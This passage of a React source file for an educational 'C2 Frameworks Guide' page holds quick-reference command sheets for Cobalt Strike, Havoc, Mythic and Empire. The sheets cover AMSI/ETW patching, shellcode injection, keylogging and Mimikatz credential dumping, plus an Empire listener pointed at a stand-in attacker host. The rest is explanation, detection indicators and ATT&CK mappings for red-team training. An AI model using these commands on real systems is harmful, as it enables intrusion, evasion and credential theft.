beacon> socks 1080         # Start SOCKS proxy
beacon> link TARGET pipe   # Link SMB beacon
beacon> connect TARGET 4444  # Connect TCP beacon

# File operations
beacon> download C:\\file.txt
beacon> upload /local/file C:\\remote.exe
beacon> timestomp target.exe source.exe`,

  havoc: `# ===== HAVOC C2 QUICK REFERENCE =====

# Start Havoc server
./havoc server --profile ./profiles/havoc.yaotl -v
./havoc server --profile ./profiles/default.yaotl --debug

# Connect client (GUI)
./havoc client
# Configure: Name, Host, Port, User, Password

# Demon agent commands
demon> help                # Show all commands
demon> sleep 10 50         # Sleep 10s, 50% jitter
demon> checkin             # Force check-in

# System information
demon> whoami              # Current user
demon> pwd                 # Current directory
demon> ps                  # Process list
demon> env                 # Environment variables
demon> net                 # Network info

# Execution
demon> shell whoami        # Execute via cmd.exe
demon> proc exec notepad.exe  # Start process
demon> powershell Get-Process # PowerShell
demon> dotnet inline-execute assembly.exe args

# BOF (Beacon Object Files)
demon> inline-execute /path/to/bof.o arg1 arg2
demon> bof-load dir_list   # Load BOF extension

# Process manipulation
demon> proc list           # List processes
demon> proc kill <pid>     # Kill process
demon> proc inject <pid>   # Inject into process
demon> shellcode inject x64 <pid> /path/shellcode.bin

# Evasion features
demon> config              # View agent config
demon> sleep-obf           # Toggle sleep obfuscation
demon> amsi patch          # Patch AMSI
demon> etw patch           # Patch ETW`,

  mythic: `# ===== MYTHIC C2 QUICK REFERENCE =====

# Installation
sudo ./install_docker_ubuntu.sh
./mythic-cli start

# Access web UI
# URL: https://localhost:7443
# Default credentials in .env file

# Mythic CLI commands
./mythic-cli status        # Check service status
./mythic-cli start         # Start all services
./mythic-cli stop          # Stop all services
./mythic-cli logs mythic_server  # View logs
./mythic-cli restart       # Restart services

# Install payload types (agents)
./mythic-cli install github https://github.com/MythicAgents/Apollo
./mythic-cli install github https://github.com/MythicAgents/Poseidon
./mythic-cli install github https://github.com/MythicAgents/Medusa

# Common payload types
# Apollo - Full-featured Windows C# agent
# Poseidon - Go-based cross-platform agent
# Medusa - Python-based cross-platform agent
# Athena - .NET cross-platform agent

# Web UI Operations
# 1. Create C2 Profile (HTTP, TCP, etc.)
# 2. Create Payload with selected agent
# 3. Download and deploy payload
# 4. View callbacks in Operations

# Task commands depend on payload type
# Apollo example:
shell whoami
ps
upload /local/file /remote/path
download /remote/path
execute-assembly /path/assembly.exe args
inject <pid>
keylog start
screenshot`,

  empire: `# ===== EMPIRE/STARKILLER QUICK REFERENCE =====

# Start Empire server
sudo ./ps-empire server

# Start Starkiller (GUI) - separate terminal
./starkiller

# Or use Empire CLI
sudo ./ps-empire client

# CLI - Listener management
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Host http://attacker.com:80
(Empire: listeners/http) > set Port 80
(Empire: listeners/http) > execute

# CLI - Stager generation
(Empire) > usestager windows/launcher_bat
(Empire: stager/windows/launcher_bat) > set Listener http
(Empire: stager/windows/launcher_bat) > execute

# CLI - Agent interaction
(Empire) > agents
(Empire) > interact <agent_name>
(Empire: <agent>) > sysinfo
(Empire: <agent>) > shell whoami
(Empire: <agent>) > upload /local/file C:\\remote.exe
(Empire: <agent>) > download C:\\file.txt
(Empire: <agent>) > usemodule collection/keylogger
(Empire: <agent>) > usemodule credentials/mimikatz/logonpasswords

# Popular modules
usemodule credentials/mimikatz/logonpasswords
usemodule credentials/mimikatz/dcsync
usemodule situational_awareness/host/winenum
usemodule lateral_movement/invoke_wmi
usemodule persistence/elevated/schtasks
usemodule privesc/bypassuac_fodhelper`,
};

// Real-world C2 traffic examples for analysis
const trafficExamples = [
  {
    name: "Cobalt Strike Default",
    description: "Default Cobalt Strike beacon profile (easily detected)",
    indicators: [
      "JA3: 72a589da586844d7f0818ce684948eea",
      "URI: /submit.php, /pixel.gif",
      "Named pipes: \\.\pipe\msagent_*",
      "Default sleep: 60000ms",
    ],
    detectionRate: "High",
  },
  {
    name: "Cobalt Strike Malleable",
    description: "Customized malleable C2 profile mimicking CDN",
    indicators: [
      "Custom JA3 (varies by profile)",
      "URIs match CDN patterns",
      "Custom headers matching target app",
      "Certificate matches CDN",
    ],
    detectionRate: "Medium",
  },
  {
    name: "Sliver Default HTTPS",
    description: "Sliver HTTPS beacon with default configuration",
    indicators: [
      "JA3: Various Go TLS fingerprints",
      "Large HTTP body sizes",
      "Binary data in response",
      "Unique certificate patterns",
    ],
    detectionRate: "Medium-High",
  },
  {
    name: "DNS Tunneling",
    description: "DNS-based C2 with encoded subdomains",
    indicators: [
      "High entropy subdomains",
      "Unusually long DNS queries",
      "High volume to single domain",
      "TXT record requests",
    ],
    detectionRate: "Medium",
  },
];

// MITRE ATT&CK mappings for C2
const mitreAttackMappings = [
  {
    tactic: "Command and Control (TA0011)",
    techniques: [
      { id: "T1071", name: "Application Layer Protocol", subtechniques: ["Web Protocols", "DNS", "Mail Protocols"] },
      { id: "T1132", name: "Data Encoding", subtechniques: ["Standard Encoding", "Non-Standard Encoding"] },
      { id: "T1573", name: "Encrypted Channel", subtechniques: ["Symmetric Cryptography", "Asymmetric Cryptography"] },
      { id: "T1572", name: "Protocol Tunneling", subtechniques: [] },
      { id: "T1090", name: "Proxy", subtechniques: ["Internal Proxy", "External Proxy", "Multi-hop Proxy", "Domain Fronting"] },
      { id: "T1219", name: "Remote Access Software", subtechniques: [] },
      { id: "T1095", name: "Non-Application Layer Protocol", subtechniques: [] },
      { id: "T1571", name: "Non-Standard Port", subtechniques: [] },
      { id: "T1008", name: "Fallback Channels", subtechniques: [] },
      { id: "T1104", name: "Multi-Stage Channels", subtechniques: [] },
    ],
  },
  {
    tactic: "Exfiltration (TA0010)",
    techniques: [
      { id: "T1041", name: "Exfiltration Over C2 Channel", subtechniques: [] },
      { id: "T1048", name: "Exfiltration Over Alternative Protocol", subtechniques: ["Symmetric Encryption", "Asymmetric Encryption"] },
    ],
  },
  {
    tactic: "Defense Evasion (TA0005)",
    techniques: [
      { id: "T1140", name: "Deobfuscate/Decode Files or Information", subtechniques: [] },
      { id: "T1027", name: "Obfuscated Files or Information", subtechniques: ["Binary Padding", "Software Packing", "Steganography"] },
      { id: "T1055", name: "Process Injection", subtechniques: ["DLL Injection", "PE Injection", "Thread Execution Hijacking"] },
    ],
  },
];

// Code block component
const CodeBlock = ({ children, language }: { children: string; language?: string }) => {
  const theme = useTheme();
  return (
    <Paper
      sx={{
        p: 2,
        bgcolor: theme.palette.mode === "dark" ? "#1a1a2e" : "#f5f5f5",
        borderRadius: 1,
        fontFamily: "monospace",
        fontSize: "0.85rem",
        overflow: "auto",
        whiteSpace: "pre-wrap",
        wordBreak: "break-word",
      }}
    >
      <code style={{ color: theme.palette.mode === "dark" ? "#22d3ee" : "#0d47a1" }}>{children}</code>
    </Paper>
  );
};

export default function C2FrameworksGuidePage() {
  const theme = useTheme();
  const navigate = useNavigate();
  const [activeTab, setActiveTab] = useState(0);

  const tabs = [
    { label: "Overview", icon: <SettingsRemoteIcon /> },
    { label: "Frameworks", icon: <BuildIcon /> },
    { label: "Protocols", icon: <NetworkCheckIcon /> },
    { label: "Infrastructure", icon: <CloudIcon /> },
    { label: "OPSEC", icon: <VisibilityOffIcon /> },
    { label: "Detection", icon: <ShieldIcon /> },
    { label: "Resources", icon: <SchoolIcon /> },
  ];

  const pageContext = `This page covers command and control (C2) frameworks for adversary simulation and red team operations. Topics include popular C2 platforms, payload generation, communication channels, evasion techniques, OPSEC considerations, detection methods, and defensive strategies.`;

  return (
    <LearnPageLayout pageTitle="C2 Frameworks Guide" pageContext={pageContext}>
    <Container maxWidth="xl" sx={{ py: 4 }}>
      {/* Header */}
      <Box sx={{ mb: 4 }}>
        <Box
          onClick={() => navigate("/learn")}
          sx={{
            display: "inline-flex",
            alignItems: "center",
            gap: 1,
            mb: 2,
            cursor: "pointer",
            color: "text.secondary",
            "&:hover": { color: "primary.main" },
          }}
        >
          <ArrowBackIcon fontSize="small" />
          <Typography variant="body2">Back to Learning Hub</Typography>
        </Box>

        <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
          <Box
            sx={{
              width: 56,
              height: 56,
              borderRadius: 2,
              bgcolor: alpha("#dc2626", 0.1),
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
            }}
          >
            <SettingsRemoteIcon sx={{ fontSize: 32, color: "#dc2626" }} />
          </Box>
          <Box>
            <Typography variant="h4" sx={{ fontWeight: 800 }}>
              Command & Control (C2) Frameworks
            </Typography>
            <Typography variant="body1" color="text.secondary">
              Understanding adversary communication infrastructure for red team operations
            </Typography>
          </Box>
        </Box>

        <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
          <Chip label="Red Team" size="small" sx={{ bgcolor: alpha("#dc2626", 0.1), color: "#dc2626" }} />
          <Chip label="Post-Exploitation" size="small" sx={{ bgcolor: alpha("#f59e0b", 0.1), color: "#f59e0b" }} />
          <Chip label="Adversary Simulation" size="small" sx={{ bgcolor: alpha("#8b5cf6", 0.1), color: "#8b5cf6" }} />
          <Chip label="Advanced" size="small" variant="outlined" />
        </Box>
      </Box>

      {/* Tabs */}
      <Paper sx={{ mb: 3, borderRadius: 2 }}>
        <Tabs
          value={activeTab}
          onChange={(_, v) => setActiveTab(v)}
          variant="scrollable"
          scrollButtons="auto"
          sx={{ borderBottom: 1, borderColor: "divider" }}
        >
          {tabs.map((tab, idx) => (
            <Tab key={idx} label={tab.label} icon={tab.icon} iconPosition="start" />
          ))}
        </Tabs>
      </Paper>

      {/* Tab 0: Overview */}
      {activeTab === 0 && (
        <Box sx={{ display: "flex", flexDirection: "column", gap: 3 }}>
          <Alert severity="warning" sx={{ borderRadius: 2 }}>
            <AlertTitle>For Authorized Testing Only</AlertTitle>
            C2 frameworks are powerful tools for authorized red team and penetration testing engagements only.
            Unauthorized use against systems you don't own or have explicit permission to test is illegal and unethical.
          </Alert>

          {/* Simple Introduction */}
          <Paper sx={{ p: 4, borderRadius: 2, bgcolor: alpha(theme.palette.primary.main, 0.02) }}>
            <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
              <LightbulbIcon sx={{ fontSize: 32, color: "#f59e0b" }} />
              <Typography variant="h5" sx={{ fontWeight: 800 }}>
                What is C2? (Explained Simply)
              </Typography>
            </Box>
            
            <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
              Imagine you're a security professional hired to test a company's defenses. You've managed to get initial access 
              to one of their computers (with permission, of course). Now what? You need a way to:
            </Typography>

            <Grid container spacing={2} sx={{ mb: 3 }}>
              <Grid item xs={12} md={6}>
                <Box sx={{ display: "flex", gap: 2, alignItems: "flex-start" }}>
                  <Box sx={{ p: 1, borderRadius: 1, bgcolor: alpha("#3b82f6", 0.1), minWidth: 40, textAlign: "center" }}>
                    <Typography variant="h6" sx={{ fontWeight: 800, color: "#3b82f6" }}>1</Typography>
                  </Box>
                  <Box>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Maintain Access</Typography>
                    <Typography variant="body2" color="text.secondary">
                      Keep your connection alive even if the user reboots or logs out
                    </Typography>
                  </Box>
                </Box>
              </Grid>
              <Grid item xs={12} md={6}>
                <Box sx={{ display: "flex", gap: 2, alignItems: "flex-start" }}>
                  <Box sx={{ p: 1, borderRadius: 1, bgcolor: alpha("#10b981", 0.1), minWidth: 40, textAlign: "center" }}>
                    <Typography variant="h6" sx={{ fontWeight: 800, color: "#10b981" }}>2</Typography>
                  </Box>
                  <Box>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Execute Commands</Typography>
                    <Typography variant="body2" color="text.secondary">
                      Run programs, explore files, and gather information remotely
                    </Typography>
                  </Box>
                </Box>
              </Grid>
              <Grid item xs={12} md={6}>
                <Box sx={{ display: "flex", gap: 2, alignItems: "flex-start" }}>
                  <Box sx={{ p: 1, borderRadius: 1, bgcolor: alpha("#f59e0b", 0.1), minWidth: 40, textAlign: "center" }}>
                    <Typography variant="h6" sx={{ fontWeight: 800, color: "#f59e0b" }}>3</Typography>
                  </Box>
                  <Box>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Stay Hidden</Typography>
                    <Typography variant="body2" color="text.secondary">
                      Avoid detection by security tools while you assess the environment
                    </Typography>
                  </Box>
                </Box>
              </Grid>
              <Grid item xs={12} md={6}>
                <Box sx={{ display: "flex", gap: 2, alignItems: "flex-start" }}>
                  <Box sx={{ p: 1, borderRadius: 1, bgcolor: alpha("#8b5cf6", 0.1), minWidth: 40, textAlign: "center" }}>
                    <Typography variant="h6" sx={{ fontWeight: 800, color: "#8b5cf6" }}>4</Typography>
                  </Box>
                  <Box>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Move Around</Typography>
                    <Typography variant="body2" color="text.secondary">
                      Reach other systems on the internal network (pivoting)
                    </Typography>
                  </Box>
                </Box>
              </Grid>
            </Grid>

            <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
              <strong>Command and Control (C2)</strong> frameworks are the tools that make all of this possible. Think of 
              them like a "remote control center" for security testing. The framework consists of two main parts:
            </Typography>

            <Grid container spacing={3} sx={{ mb: 3 }}>
              <Grid item xs={12} md={6}>
                <Card sx={{ p: 2, height: "100%", border: `2px solid ${alpha("#dc2626", 0.2)}` }}>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                    <StorageIcon sx={{ color: "#dc2626" }} />
                    <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>The Server (Your Control Center)</Typography>
                  </Box>
                  <Typography variant="body2" color="text.secondary">
                    This runs on your infrastructure. It's like mission control - you use it to send commands, receive 
                    data, and manage all your operations. Multiple team members can connect to collaborate.
                  </Typography>
                </Card>
              </Grid>
              <Grid item xs={12} md={6}>
                <Card sx={{ p: 2, height: "100%", border: `2px solid ${alpha("#3b82f6", 0.2)}` }}>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                    <BugReportIcon sx={{ color: "#3b82f6" }} />
                    <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>The Agent/Implant (On Target)</Typography>
                  </Box>
                  <Typography variant="body2" color="text.secondary">
                    This is a small program that runs on the compromised system. It "phones home" to your server 
                    periodically, checks for commands to execute, and sends back results. Also called a "beacon" or "implant".
                  </Typography>
                </Card>
              </Grid>
            </Grid>

            <Divider sx={{ my: 3 }} />

            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              A Simple Analogy: The Spy Phone
            </Typography>
            <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
              Think of C2 like a spy's secret phone. The spy (implant) is working undercover in enemy territory 
              (the target network). Periodically, the spy calls headquarters (the C2 server) using an encrypted 
              line (C2 protocol) to:
            </Typography>
            <List dense>
              <ListItem>
                <ListItemIcon><CheckCircleIcon sx={{ color: "success.main", fontSize: 18 }} /></ListItemIcon>
                <ListItemText 
                  primary="Check for new instructions (commands to execute)"
                  primaryTypographyProps={{ variant: "body2" }}
                />
              </ListItem>
              <ListItem>
                <ListItemIcon><CheckCircleIcon sx={{ color: "success.main", fontSize: 18 }} /></ListItemIcon>
                <ListItemText 
                  primary="Report what they've discovered (data exfiltration)"
                  primaryTypographyProps={{ variant: "body2" }}
                />
              </ListItem>
              <ListItem>
                <ListItemIcon><CheckCircleIcon sx={{ color: "success.main", fontSize: 18 }} /></ListItemIcon>
                <ListItemText 
                  primary="Request resources they need (upload tools)"
                  primaryTypographyProps={{ variant: "body2" }}
                />
              </ListItem>
              <ListItem>
                <ListItemIcon><CheckCircleIcon sx={{ color: "success.main", fontSize: 18 }} /></ListItemIcon>
                <ListItemText 
                  primary="Confirm they're still active (heartbeat)"
                  primaryTypographyProps={{ variant: "body2" }}
                />
              </ListItem>
            </List>

            <Alert severity="info" sx={{ mt: 2 }}>
              <AlertTitle>Why Do Security Professionals Need This?</AlertTitle>
              Real attackers use C2 frameworks. To test if an organization can detect and stop actual threats, 
              red teams need to simulate realistic attack scenarios using the same types of tools. This helps 
              identify gaps in defenses before real attackers exploit them.
            </Alert>
          </Paper>

          {/* How C2 Communication Works */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 3 }}>
              How C2 Communication Works
            </Typography>
            
            <Stepper orientation="vertical" sx={{ mb: 3 }}>
              <Step active>
                <StepLabel>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Initial Compromise</Typography>
                </StepLabel>
                <StepContent>
                  <Typography variant="body2" color="text.secondary">
                    The attacker gains initial access (phishing, exploit, etc.) and deploys the implant/agent on the target system.
                    This could be through a malicious document, drive-by download, or exploiting a vulnerability.
                  </Typography>
                </StepContent>
              </Step>
              <Step active>
                <StepLabel>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Beacon Callback</Typography>
                </StepLabel>
                <StepContent>
                  <Typography variant="body2" color="text.secondary">
                    The implant "phones home" to the C2 server. This first callback registers the compromised host with the 
                    server and provides basic information (hostname, username, OS, privileges). The implant then enters a 
                    sleep/beacon cycle.
                  </Typography>
                </StepContent>
              </Step>
              <Step active>
                <StepLabel>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Command & Response Loop</Typography>
                </StepLabel>
                <StepContent>
                  <Typography variant="body2" color="text.secondary">
                    Periodically, the implant wakes up and checks in with the server. If the operator has queued 
                    commands (run whoami, list files, etc.), the implant downloads and executes them. Results are 
                    sent back to the server on the next check-in.
                  </Typography>
                </StepContent>
              </Step>
              <Step active>
                <StepLabel>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Post-Exploitation</Typography>
                </StepLabel>
                <StepContent>
                  <Typography variant="body2" color="text.secondary">
                    Operators use the C2 connection to conduct further actions: privilege escalation, credential 
                    harvesting, lateral movement to other systems, and data collection. Each action is executed 
                    through the established C2 channel.
                  </Typography>
                </StepContent>
              </Step>
            </Stepper>

            <CodeBlock>{`# Simplified C2 Communication Flow

┌─────────────┐                           ┌─────────────┐
│   Implant   │   1. Beacon (check-in)    │  C2 Server  │
│  (Target)   │ ─────────────────────────>│  (Attacker) │
│             │                           │             │
│             │   2. Commands (if any)    │             │
│             │ <─────────────────────────│             │
│             │                           │             │
│             │   3. Execute commands     │             │
│             │        locally            │             │
│             │                           │             │
│             │   4. Results on next      │             │
│             │      check-in             │             │
│             │ ─────────────────────────>│             │
└─────────────┘                           └─────────────┘

Timeline:
[Sleep] → [Wake] → [Beacon] → [Get Tasks] → [Execute] → [Sleep]...`}</CodeBlock>
          </Paper>

          {/* Key Concepts */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Key Concepts You Need to Know
            </Typography>
            <Grid container spacing={2}>
              {[
                { 
                  term: "Beacon/Implant/Agent", 
                  definition: "The malware that runs on the target system. It 'beacons' (calls) back to the C2 server periodically.",
                  icon: <BugReportIcon />,
                  color: "#3b82f6"
                },
                { 
                  term: "Team Server", 
                  definition: "The central server where operators connect to manage operations. Never expose directly to the internet.",
                  icon: <StorageIcon />,
                  color: "#dc2626"
                },
                { 
                  term: "Listener", 
                  definition: "A service on the C2 server that waits for implant connections. Different listeners for different protocols (HTTP, DNS, etc.).",
                  icon: <NetworkCheckIcon />,
                  color: "#10b981"
                },
                { 
                  term: "Sleep/Jitter", 
                  definition: "How long the implant waits between check-ins (sleep) and the randomness added to avoid patterns (jitter).",
                  icon: <TimelineIcon />,
                  color: "#f59e0b"
                },
                { 
                  term: "Redirector", 
                  definition: "A proxy server that hides your real C2 server. If detected, burn the redirector, not your infrastructure.",
                  icon: <AccountTreeIcon />,
                  color: "#8b5cf6"
                },
                { 
                  term: "Malleable Profile", 
                  definition: "Configuration that customizes how C2 traffic looks. Makes your traffic mimic legitimate applications.",
                  icon: <PsychologyIcon />,
                  color: "#ec4899"
                },
                { 
                  term: "Staging", 
                  definition: "Delivering the implant in stages. First a small 'stager' downloads the full implant. Helps avoid detection.",
                  icon: <TrendingUpIcon />,
                  color: "#14b8a6"
                },
                { 
                  term: "Pivoting", 
                  definition: "Using a compromised host to reach other internal systems that aren't directly accessible from outside.",
                  icon: <SyncAltIcon />,
                  color: "#f97316"
                },
              ].map((item) => (
                <Grid item xs={12} md={6} key={item.term}>
                  <Card sx={{ p: 2, height: "100%" }}>
                    <Box sx={{ display: "flex", alignItems: "center", gap: 1.5, mb: 1 }}>
                      <Box sx={{ color: item.color }}>{item.icon}</Box>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{item.term}</Typography>
                    </Box>
                    <Typography variant="body2" color="text.secondary">{item.definition}</Typography>
                  </Card>
                </Grid>
              ))}
            </Grid>
          </Paper>

          {/* C2 Architecture */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              C2 Architecture Components
            </Typography>
            <Typography variant="body2" color="text.secondary" sx={{ mb: 3 }}>
              A professional red team operation uses layered infrastructure for protection and flexibility.
            </Typography>
            <Grid container spacing={2}>
              {[
                { name: "Team Server", desc: "Central management server for operators - your command center", icon: <StorageIcon />, color: "#dc2626" },
                { name: "Implant/Agent", desc: "Payload running on compromised host - your eyes and hands", icon: <BugReportIcon />, color: "#3b82f6" },
                { name: "Listener", desc: "Service waiting for implant connections on specific ports/protocols", icon: <NetworkCheckIcon />, color: "#10b981" },
                { name: "Redirector", desc: "Proxy to hide team server location - expendable front-line", icon: <AccountTreeIcon />, color: "#8b5cf6" },
                { name: "Payload Staging", desc: "Serves initial payloads/stagers - short-lived, separate infra", icon: <CodeIcon />, color: "#f59e0b" },
                { name: "Operator Client", desc: "Your interface to the team server - GUI or command line", icon: <ComputerIcon />, color: "#ec4899" },
              ].map((item) => (
                <Grid item xs={6} md={4} key={item.name}>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1.5 }}>
                    <Box sx={{ color: item.color }}>{item.icon}</Box>
                    <Box>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{item.name}</Typography>
                      <Typography variant="caption" color="text.secondary">{item.desc}</Typography>
                    </Box>
                  </Box>
                </Grid>
              ))}
            </Grid>
          </Paper>

          {/* MITRE ATT&CK Mapping */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              MITRE ATT&CK Mapping
            </Typography>
            <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
              C2 frameworks implement techniques across multiple ATT&CK tactics. Understanding this helps with both offense and defense.
            </Typography>
            {mitreAttackMappings.map((tactic, idx) => (
              <Accordion key={idx} defaultExpanded={idx === 0}>
                <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                  <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>{tactic.tactic}</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Grid container spacing={1}>
                    {tactic.techniques.map((tech, tidx) => (
                      <Grid item xs={12} sm={6} md={4} key={tidx}>
                        <Chip 
                          label={`${tech.id}: ${tech.name}`} 
                          size="small" 
                          variant="outlined"
                          sx={{ m: 0.25 }}
                        />
                        {tech.subtechniques.length > 0 && (
                          <Typography variant="caption" color="text.secondary" sx={{ display: "block", ml: 1 }}>
                            └ {tech.subtechniques.join(", ")}
                          </Typography>
                        )}
                      </Grid>
                    ))}
                  </Grid>
                </AccordionDetails>
              </Accordion>
            ))}
          </Paper>

          {/* Why C2 Matters */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Why C2 Frameworks Matter
            </Typography>
            <Grid container spacing={2}>
              <Grid item xs={12} md={6}>
                <Card sx={{ p: 2, height: "100%", bgcolor: alpha("#dc2626", 0.05) }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#dc2626", mb: 1 }}>
                    For Red Teams (Offense)
                  </Typography>
                  <List dense>
                    {[
                      "Simulate real-world adversary behavior",
                      "Test detection and response capabilities",
                      "Demonstrate actual risk to stakeholders",
                      "Validate security control effectiveness",
                      "Conduct realistic adversary emulation",
                    ].map((item, i) => (
                      <ListItem key={i} sx={{ py: 0.25 }}>
                        <ListItemIcon sx={{ minWidth: 24 }}>
                          <TerminalIcon sx={{ fontSize: 14, color: "#dc2626" }} />
                        </ListItemIcon>
                        <ListItemText primary={item} primaryTypographyProps={{ variant: "body2" }} />
                      </ListItem>
                    ))}
                  </List>
                </Card>
              </Grid>
              <Grid item xs={12} md={6}>
                <Card sx={{ p: 2, height: "100%", bgcolor: alpha("#3b82f6", 0.05) }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#3b82f6", mb: 1 }}>
                    For Blue Teams (Defense)
                  </Typography>
                  <List dense>
                    {[
                      "Understand attacker techniques to build detections",
                      "Test security tools against known C2 traffic",
                      "Develop behavioral detection strategies",
                      "Train SOC analysts on realistic scenarios",
                      "Validate incident response procedures",
                    ].map((item, i) => (
                      <ListItem key={i} sx={{ py: 0.25 }}>
                        <ListItemIcon sx={{ minWidth: 24 }}>
                          <ShieldIcon sx={{ fontSize: 14, color: "#3b82f6" }} />
                        </ListItemIcon>
                        <ListItemText primary={item} primaryTypographyProps={{ variant: "body2" }} />
                      </ListItem>
                    ))}
                  </List>
                </Card>
              </Grid>
            </Grid>
          </Paper>
        </Box>
      )}

      {/* Tab 1: Frameworks */}
      {activeTab === 1 && (
        <Box sx={{ display: "flex", flexDirection: "column", gap: 3 }}>
          <Alert severity="info" sx={{ borderRadius: 2 }}>
            <AlertTitle>Choosing a C2 Framework</AlertTitle>
            Consider your operation's requirements: stealth level, target OS, team collaboration, and budget.
            Many teams use multiple frameworks for different scenarios. Start with Sliver for learning - it's free,
            modern, and has excellent documentation.
          </Alert>

          {c2Frameworks.map((fw, idx) => (
            <Accordion key={idx} defaultExpanded={idx === 0}>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 2, width: "100%" }}>
                  <SettingsRemoteIcon sx={{ color: fw.type === "Commercial" ? "#f59e0b" : "#10b981" }} />
                  <Box sx={{ flex: 1 }}>
                    <Typography variant="h6" sx={{ fontWeight: 700 }}>{fw.name}</Typography>
                    <Typography variant="body2" color="text.secondary">{fw.description}</Typography>
                  </Box>
                  <Box sx={{ display: "flex", gap: 1 }}>
                    <Chip label={fw.type} size="small" sx={{ bgcolor: alpha(fw.type === "Commercial" ? "#f59e0b" : "#10b981", 0.1), color: fw.type === "Commercial" ? "#f59e0b" : "#10b981" }} />
                    <Chip label={fw.difficulty} size="small" variant="outlined" />
                  </Box>
                </Box>
              </AccordionSummary>
              <AccordionDetails>
                {/* Extended description */}
                {fw.longDescription && (
                  <Alert severity="info" icon={<LightbulbIcon />} sx={{ mb: 2 }}>
                    <Typography variant="body2">{fw.longDescription}</Typography>
                  </Alert>
                )}
                
                <Grid container spacing={3}>
                  <Grid item xs={12} md={4}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Key Features</Typography>
                    <List dense>
                      {fw.features.map((f, i) => (
                        <ListItem key={i} sx={{ py: 0.25 }}>
                          <ListItemIcon sx={{ minWidth: 24 }}>
                            <CheckCircleIcon sx={{ fontSize: 14, color: "success.main" }} />
                          </ListItemIcon>
                          <ListItemText primary={f} primaryTypographyProps={{ variant: "body2" }} />
                        </ListItem>
                      ))}
                    </List>
                  </Grid>
                  <Grid item xs={12} md={4}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Supported Protocols</Typography>
                    <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5 }}>
                      {fw.protocols.map((p, i) => (
                        <Chip key={i} label={p} size="small" variant="outlined" />
                      ))}
                    </Box>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mt: 2, mb: 1 }}>Primary Language</Typography>
                    <Typography variant="body2">{fw.language}</Typography>
                  </Grid>
                  <Grid item xs={12} md={4}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Cost</Typography>
                    <Typography variant="body2" sx={{ mb: 2 }}>{fw.cost}</Typography>
                    <Typography
                      component="a"
                      href={fw.url}
                      target="_blank"
                      rel="noopener"
                      sx={{ color: "primary.main", textDecoration: "none", "&:hover": { textDecoration: "underline" } }}
                    >
                      Documentation →
                    </Typography>
                  </Grid>

                  {/* Use Cases */}
                  {fw.useCases && fw.useCases.length > 0 && (
                    <Grid item xs={12} md={6}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "success.main" }}>
                        <CheckCircleIcon sx={{ fontSize: 16, mr: 0.5, verticalAlign: "middle" }} />
                        Best Used For
                      </Typography>
                      <List dense>
                        {fw.useCases.map((uc, i) => (
                          <ListItem key={i} sx={{ py: 0.25 }}>
                            <ListItemText primary={`• ${uc}`} primaryTypographyProps={{ variant: "body2", color: "text.secondary" }} />
                          </ListItem>
                        ))}
                      </List>
                    </Grid>
                  )}

                  {/* Limitations */}
                  {fw.limitations && fw.limitations.length > 0 && (
                    <Grid item xs={12} md={6}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "warning.main" }}>
                        <WarningIcon sx={{ fontSize: 16, mr: 0.5, verticalAlign: "middle" }} />
                        Limitations
                      </Typography>
                      <List dense>
                        {fw.limitations.map((lim, i) => (
                          <ListItem key={i} sx={{ py: 0.25 }}>
                            <ListItemText primary={`• ${lim}`} primaryTypographyProps={{ variant: "body2", color: "text.secondary" }} />
                          </ListItem>
                        ))}
                      </List>
                    </Grid>
                  )}
                </Grid>
              </AccordionDetails>
            </Accordion>
          ))}

          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
